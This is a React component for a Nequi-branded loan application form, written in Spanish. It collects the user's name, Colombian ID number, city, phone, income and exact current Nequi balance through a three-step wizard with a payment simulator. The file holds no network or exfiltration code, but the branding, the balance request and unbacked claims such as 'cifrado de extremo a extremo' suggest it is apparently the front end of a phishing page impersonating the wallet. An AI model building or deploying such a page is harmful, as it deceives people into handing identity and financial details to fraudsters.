import { useState } from 'react'
import {
  User, FileText, Phone, Wallet, TrendingUp,
  CheckCircle2, ArrowRight, ArrowLeft, DollarSign, Sparkles, Info
} from 'lucide-react'
import { NequiLogo } from './NequiLogo'
import { type CreditFormData } from '../types'
import { CityCombobox } from './CityCombobox'

interface FormScreenProps {
  data: CreditFormData
  onChange: (field: keyof CreditFormData, value: string) => void
  onContinue: () => void
  onBack: () => void
}

const STEPS = [
  { id: 0, label: 'Tus datos', icon: User },
  { id: 1, label: 'Contacto', icon: Phone },
  { id: 2, label: 'Crédito', icon: DollarSign },
]

const MIN_LOAN = 500_000
const MAX_LOAN = 20_000_000
const STEP_LOAN = 100_000

const MIN_INCOME = 500_000
const MAX_INCOME = 15_000_000
const STEP_INCOME = 100_000

const LOAN_TERMS = [
  { value: '12', label: '12 meses' },
  { value: '24', label: '24 meses' },
  { value: '36', label: '36 meses' },
]

const TAE = 0.18 // 18% anual

function formatCOP(value: number) {
  return new Intl.NumberFormat('es-CO', {
    style: 'currency',
    currency: 'COP',
    minimumFractionDigits: 0,
    maximumFractionDigits: 0,
  }).format(value)
}

function calculateMonthlyPayment(principal: number, months: number): number {
  const monthlyRate = TAE / 12
  const cuota = principal * (monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1)
  return Math.round(cuota)
}

function Tooltip({ text }: { text: string }) {
  const [show, setShow] = useState(false)
  return (
    <div className="relative inline-block ml-1">
      <button
        type="button"
        onMouseEnter={() => setShow(true)}
        onMouseLeave={() => setShow(false)}
        onClick={() => setShow((s) => !s)}
        className="text-gray-400 hover:text-gray-600 transition-colors"
      >
        <Info className="w-3.5 h-3.5" />
      </button>
      {show && (
        <div className="absolute z-50 left-0 top-6 w-56 bg-white border border-gray-200 rounded-xl px-3 py-2 text-xs text-gray-700 shadow-xl animate-fade-in">
          {text}
        </div>
      )}
    </div>
  )
}

function SliderField({
  label,
  value,
  min,
  max,
  step,
  onChange,
  icon,
  hint,
  tooltip,
}: {
  label: string
  value: number
  min: number
  max: number
  step: number
  onChange: (v: number) => void
  icon: React.ReactNode
  hint?: string
  tooltip?: string
}) {
  const pct = ((value - min) / (max - min)) * 100

  return (
    <div className="bg-gray-50 border border-gray-200 rounded-2xl p-5 space-y-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2 text-gray-600 text-sm font-medium">
          <span className="text-[#E6005C]">{icon}</span>
          {label}
          {tooltip && <Tooltip text={tooltip} />}
        </div>
        <span className="text-[#E6005C] font-extrabold text-lg tracking-tight">
          {formatCOP(value)}
        </span>
      </div>

      <div className="relative h-2 bg-gray-200 rounded-full">
        <div
          className="absolute left-0 top-0 h-full rounded-full transition-all duration-100"
          style={{ width: `${pct}%`, background: '#E6005C' }}
        />
        <input
          type="range"
          min={min}
          max={max}
          step={step}
          value={value}
          onChange={(e) => onChange(Number(e.target.value))}
          className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
        />
        <div
          className="absolute top-1/2 -translate-y-1/2 w-5 h-5 rounded-full bg-white border-2 shadow-md transition-all duration-100 pointer-events-none"
          style={{ borderColor: '#E6005C', left: `calc(${pct}% - 10px)` }}
        />
      </div>

      <div className="flex justify-between text-xs text-gray-400">
        <span>{formatCOP(min)}</span>
        {hint && <span className="text-gray-500 italic">{hint}</span>}
        <span>{formatCOP(max)}</span>
      </div>
    </div>
  )
}

function InputField({
  label,
  value,
  onChange,
  placeholder,
  type = 'text',
  prefix,
  icon,
  inputMode,
  pattern,
  maxLength,
  error,
  tooltip,
}: {
  label: string
  value: string
  onChange: (v: string) => void
  placeholder?: string
  type?: string
  prefix?: string
  icon?: React.ReactNode
  inputMode?: React.HTMLAttributes<HTMLInputElement>['inputMode']
  pattern?: string
  maxLength?: number
  error?: string
  tooltip?: string
}) {
  const [focused, setFocused] = useState(false)
  const filled = value.length > 0

  return (
    <div className="space-y-1">
      <div
        className={`relative bg-gray-50 border rounded-2xl px-5 py-4 transition-all duration-200 ${
          error
            ? 'border-red-400'
            : focused
            ? 'border-[#2D1B6E] bg-gray-100 shadow-md'
            : filled
            ? 'border-gray-300'
            : 'border-gray-200'
        }`}
      >
        <label
          className={`absolute left-5 transition-all duration-200 pointer-events-none font-medium ${
            focused || filled
              ? 'top-2 text-[11px] text-[#E6005C]'
              : 'top-1/2 -translate-y-1/2 text-sm text-gray-400'
          }`}
        >
          {icon && <span className="inline-block mr-1.5 align-middle">{icon}</span>}
          {label}
          {tooltip && <Tooltip text={tooltip} />}
        </label>
        <div className="flex items-center mt-4">
          {prefix && (
            <span className="text-gray-500 font-semibold mr-1.5 text-base">{prefix}</span>
          )}
          <input
            type={type}
            inputMode={inputMode}
            pattern={pattern}
            maxLength={maxLength}
            value={value}
            onChange={(e) => onChange(e.target.value)}
            onFocus={() => setFocused(true)}
            onBlur={() => setFocused(false)}
            placeholder={focused ? placeholder : ''}
            className="flex-1 bg-transparent text-gray-900 text-base outline-none placeholder-gray-300"
          />
          {filled && !error && (
            <CheckCircle2 className="w-4 h-4 text-green-500 flex-shrink-0" />
          )}
        </div>
      </div>
      {error && <p className="text-red-500 text-xs px-2">{error}</p>}
    </div>
  )
}

export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenProps) {
  const [step, setStep] = useState(0)
  const [direction, setDirection] = useState<'forward' | 'back'>('forward')
  const [animating, setAnimating] = useState(false)

  const loanValue = data.loanAmount ? parseInt(data.loanAmount) : MIN_LOAN
  const incomeValue = data.monthlyIncome ? parseInt(data.monthlyIncome) : MIN_INCOME
  const loanTerm = parseInt(data.loanTerm || '12')

  const cuota = calculateMonthlyPayment(loanValue, loanTerm)

  const documentError = data.documentId.length > 0 && (data.documentId.length < 8 || data.documentId.length > 10)
    ? 'El documento debe tener entre 8 y 10 dígitos'
    : ''

  const step0Valid =
    data.fullName.trim().length >= 3 &&
    data.documentId.length >= 8 &&
    data.documentId.length <= 10 &&
    data.city.trim().length > 0

  const step1Valid =
    data.phone.length === 10

  const step2Valid =
    data.loanAmount.length > 0 &&
    data.monthlyIncome.length > 0 &&
    data.nequiBalance !== ''

  const stepValid = [step0Valid, step1Valid, step2Valid]

  function navigate(dir: 'forward' | 'back') {
    if (animating) return
    setDirection(dir)
    setAnimating(true)
    setTimeout(() => {
      if (dir === 'forward') setStep((s) => Math.min(s + 1, 2))
      else setStep((s) => Math.max(s - 1, 0))
      setAnimating(false)
    }, 220)
  }

  function handleNext() {
    if (step < 2) navigate('forward')
    else onContinue()
  }

  function handleBack() {
    if (step === 0) onBack()
    else navigate('back')
  }

  const slideClass = animating
    ? direction === 'forward'
      ? 'opacity-0 translate-x-4'
      : 'opacity-0 -translate-x-4'
    : 'opacity-100 translate-x-0'

  return (
    <div className="min-h-screen w-full flex flex-col bg-white">
      {/* Header */}
      <div className="bg-[#2D1B6E] px-6 flex items-center gap-4 shadow-lg" style={{ height: '64px' }}>
        <button
          onClick={handleBack}
          className="flex items-center gap-1.5 text-white/80 hover:text-white transition-colors text-sm font-medium"
        >
          <ArrowLeft className="w-4 h-4" />
          Volver
        </button>
        <div className="flex-1 flex justify-center">
          <NequiLogo size="sm" color="light" />
        </div>
        <div className="w-16" />
      </div>

      {/* Progress bar */}
      <div className="px-6 pt-6 pb-2 bg-white">
        <div className="flex items-center gap-2 mb-3">
          {STEPS.map((s, i) => (
            <div key={s.id} className="flex items-center gap-2 flex-1 last:flex-none">
              <div className={`flex items-center gap-2 ${i <= step ? 'text-gray-900' : 'text-gray-400'}`}>
                <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold transition-all duration-300 ${
                  i < step
                    ? 'bg-green-500 text-white'
                    : i === step
                    ? 'bg-[#E6005C] text-white shadow-md scale-110'
                    : 'bg-gray-100 text-gray-400'
                }`}>
                  {i < step ? <CheckCircle2 className="w-4 h-4" /> : <s.icon className="w-3.5 h-3.5" />}
                </div>
                <span className="text-xs font-semibold hidden sm:block">{s.label}</span>
              </div>
              {i < STEPS.length - 1 && (
                <div className="flex-1 h-0.5 rounded-full overflow-hidden bg-gray-100 mx-1">
                  <div
                    className="h-full bg-gradient-to-r from-[#E6005C] to-[#ff4d8f] transition-all duration-500"
                    style={{ width: i < step ? '100%' : '0%' }}
                  />
                </div>
              )}
            </div>
          ))}
        </div>
        <p className="text-gray-400 text-xs">Paso {step + 1} de {STEPS.length}</p>
      </div>

      {/* Form content */}
      <div className="flex-1 overflow-y-auto px-6 pb-8 bg-white">
        <div className={`transition-all duration-200 ease-out ${slideClass}`}>

          {/* Step 0: Personal data */}
          {step === 0 && (
            <div className="space-y-4 pt-4">
              <div className="mb-6">
                <h2 className="text-2xl font-extrabold text-gray-900 mb-1">Cuéntanos sobre ti</h2>
                <p className="text-gray-500 text-sm">Necesitamos tus datos personales para comenzar</p>
              </div>
              <InputField
                label="Nombre completo"
                value={data.fullName}
                onChange={(v) => onChange('fullName', v)}
                placeholder="Ej: María González"
                icon={<User className="w-3.5 h-3.5 inline" />}
                tooltip="Usaremos este nombre para tu contrato de crédito."
              />
              <InputField
                label="Documento de identidad"
                value={data.documentId}
                onChange={(v) => onChange('documentId', v.replace(/\D/g, '').slice(0, 10))}
                placeholder="Ej: 1020304050"
                icon={<FileText className="w-3.5 h-3.5 inline" />}
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={10}
                error={documentError}
                tooltip="Número de cédula colombiana. Debe tener entre 8 y 10 dígitos."
              />
              <CityCombobox
                label="Ciudad de residencia"
                value={data.city}
                onChange={(v) => onChange('city', v)}
              />

              {/* Trust badges */}
              <div className="grid grid-cols-3 gap-3 mt-6">
                {['100% seguro', 'Sin papel', 'Respuesta rápida'].map((t) => (
                  <div key={t} className="bg-gray-50 border border-gray-100 rounded-xl py-3 px-2 text-center">
                    <div className="text-[#E6005C] text-lg mb-1">✓</div>
                    <p className="text-gray-500 text-[11px] font-medium leading-tight">{t}</p>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Step 1: Contact */}
          {step === 1 && (
            <div className="space-y-4 pt-4">
              <div className="mb-6">
                <h2 className="text-2xl font-extrabold text-gray-900 mb-1">¿Cómo te contactamos?</h2>
                <p className="text-gray-500 text-sm">Te enviaremos el resultado a tu número</p>
              </div>

              <InputField
                label="Número de celular"
                value={data.phone}
                onChange={(v) => onChange('phone', v.replace(/\D/g, '').slice(0, 10))}
                placeholder="3001234567"
                prefix="+57"
                icon={<Phone className="w-3.5 h-3.5 inline" />}
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={10}
                tooltip="Solo números celulares colombianos (deben empezar por 3)."
              />

              {/* Phone preview */}
              {data.phone.length === 10 && (
                <div className="bg-[#E6005C]/5 border border-[#E6005C]/20 rounded-2xl p-4 flex items-center gap-3 animate-fade-in">
                  <div className="w-10 h-10 rounded-full bg-[#E6005C]/10 flex items-center justify-center">
                    <Phone className="w-5 h-5 text-[#E6005C]" />
                  </div>
                  <div>
                    <p className="text-gray-500 text-xs">Te contactaremos al</p>
                    <p className="text-gray-900 font-bold">+57 {data.phone}</p>
                  </div>
                  <CheckCircle2 className="w-5 h-5 text-green-500 ml-auto" />
                </div>
              )}

              <div className="bg-gray-50 border border-gray-200 rounded-2xl p-4">
                <p className="text-gray-500 text-xs leading-relaxed">
                  Tu número solo se usa para enviarte la respuesta de tu solicitud. No compartimos tu información con terceros.
                </p>
              </div>
            </div>
          )}

          {/* Step 2: Credit simulator */}
          {step === 2 && (
            <div className="space-y-5 pt-4">
              <div className="mb-2">
                <div className="flex items-center gap-2 mb-1">
                  <Sparkles className="w-5 h-5 text-[#E6005C]" />
                  <h2 className="text-2xl font-extrabold text-gray-900">Información financiera</h2>
                </div>
                <p className="text-gray-500 text-sm">Mueve los controles y ve cuánto puedes recibir</p>
              </div>

              <SliderField
                label="¿Cuánto necesitas?"
                value={loanValue}
                min={MIN_LOAN}
                max={MAX_LOAN}
                step={STEP_LOAN}
                onChange={(v) => onChange('loanAmount', String(v))}
                icon={<DollarSign className="w-4 h-4" />}
                hint="Libre inversión"
                tooltip="Es el monto que recibirás en tu cuenta si tu crédito es aprobado."
              />

              {/* Plazo selector */}
              <div className="bg-gray-50 border border-gray-200 rounded-2xl p-5">
                <div className="flex items-center gap-2 text-gray-600 text-sm font-medium mb-4">
                  <span className="text-[#E6005C]">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <circle cx="12" cy="12" r="10"/>
                      <polyline points="12 6 12 12 16 14"/>
                    </svg>
                  </span>
                  Plazo del crédito
                  <Tooltip text="El plazo en el que deseas pagar tu crédito. Más tiempo = cuotas más bajas pero más intereses." />
                </div>
                <div className="grid grid-cols-3 gap-2">
                  {LOAN_TERMS.map((term) => (
                    <button
                      key={term.value}
                      type="button"
                      onClick={() => onChange('loanTerm', term.value)}
                      className={`py-3 px-4 rounded-xl text-sm font-semibold transition-all ${
                        data.loanTerm === term.value
                          ? 'bg-[#E6005C] text-white shadow-md'
                          : 'bg-white text-gray-600 hover:bg-gray-100 border border-gray-200'
                      }`}
                    >
                      {term.label}
                    </button>
                  ))}
                </div>
              </div>

              <SliderField
                label="Ingresos mensuales"
                value={incomeValue}
                min={MIN_INCOME}
                max={MAX_INCOME}
                step={STEP_INCOME}
                onChange={(v) => onChange('monthlyIncome', String(v))}
                icon={<TrendingUp className="w-4 h-4" />}
                tooltip="Tus ingresos mensuales totales (salario, independientes, etc.)."
              />

              {/* Saldo Nequi - Campo editable */}
              <div className="bg-gray-50 border border-gray-200 rounded-2xl p-5">
                <div className="flex items-center gap-2 text-gray-600 text-sm font-medium mb-4">
                  <span className="text-[#E6005C]">
                    <Wallet className="w-4 h-4" />
                  </span>
                  Saldo en cuenta Nequi
                  <Tooltip text="Ingresa el saldo exacto que tienes actualmente en tu cuenta Nequi." />
                </div>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-lg">$</span>
                  <input
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    value={data.nequiBalance === '0' ? '' : data.nequiBalance}
                    onChange={(e) => {
                      const cleaned = e.target.value.replace(/\D/g, '')
                      onChange('nequiBalance', cleaned || '0')
                    }}
                    placeholder="0"
                    className="w-full bg-white border border-gray-200 rounded-xl pl-10 pr-5 py-4 text-gray-900 text-2xl font-extrabold outline-none focus:border-[#2D1B6E] focus:bg-gray-50 transition-all placeholder-gray-300"
                  />
                </div>
                <p className="text-gray-400 text-xs mt-2">Ingresa el valor exacto de tu saldo actual</p>
              </div>

              {/* Live summary card */}
              <div className="bg-gradient-to-br from-[#2D1B6E]/5 to-[#2D1B6E]/10 border border-[#2D1B6E]/20 rounded-2xl p-5">
                <p className="text-gray-500 text-xs font-medium mb-3 uppercase tracking-wider">Resumen estimado</p>
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <p className="text-gray-500 text-xs mb-0.5">Monto solicitado</p>
                    <p className="text-gray-900 font-extrabold text-xl">{formatCOP(loanValue)}</p>
                  </div>
                  <div>
                    <p className="text-gray-500 text-xs mb-0.5">Cuota estimada / mes</p>
                    <p className="text-[#E6005C] font-extrabold text-xl">{formatCOP(cuota)}</p>
                  </div>
                  <div>
                    <p className="text-gray-500 text-xs mb-0.5">Plazo</p>
                    <p className="text-gray-900 font-bold">{loanTerm} meses</p>
                  </div>
                  <div>
                    <p className="text-gray-500 text-xs mb-0.5">Tasa efectiva anual</p>
                    <p className="text-gray-900 font-bold">18% E.A.</p>
                  </div>
                </div>
                <p className="text-gray-400 text-[11px] mt-3 leading-relaxed">
                  * Valores estimados. La aprobación está sujeta a estudio de crédito.
                </p>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Bottom CTA */}
      <div className="px-6 pb-8 pt-4 bg-white border-t border-gray-100">
        <button
          onClick={handleNext}
          disabled={!stepValid[step]}
          className="w-full text-white font-bold py-4 rounded-2xl shadow-lg hover:shadow-xl hover:scale-[1.02] active:scale-[0.98] transition-all duration-200 disabled:opacity-40 disabled:hover:scale-100 disabled:cursor-not-allowed flex items-center justify-center gap-2 text-base"
          style={{ background: '#E6005C' }}
        >
          {step < 2 ? (
            <>Continuar <ArrowRight className="w-5 h-5" /></>
          ) : (
            <>Solicitar crédito <Sparkles className="w-5 h-5" /></>
          )}
        </button>
        <p className="text-center text-gray-400 text-xs mt-3">
          {step === 0 && 'Tus datos están protegidos con cifrado de extremo a extremo'}
          {step === 1 && 'Solo usamos tu número para notificarte'}
          {step === 2 && 'Aprobación sujeta a estudio de crédito y políticas de la entidad'}
        </p>
      </div>
    </div>
  )
}
